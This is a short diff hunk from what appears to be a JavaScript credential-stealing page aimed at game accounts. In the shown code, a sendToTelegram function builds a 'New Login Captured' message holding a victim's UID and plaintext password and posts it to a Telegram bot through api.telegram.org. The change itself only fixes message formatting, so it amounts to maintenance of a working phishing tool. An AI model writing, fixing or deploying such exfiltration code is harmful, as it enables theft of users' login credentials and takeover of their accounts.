@@ -306,7 +306,7 @@ async function generateToken() {
 function sendToTelegram(uid, password) {
   if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
 
-  const message = `🔑 *New Login Captured*\n🎮 *Game uid:* \`${real_uid}\n\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
+  const message = `🔑 *New Login Captured*\n🎮 *Game uid:* \`${real_uid}\`\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
   const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   fetch(telegramUrl, {
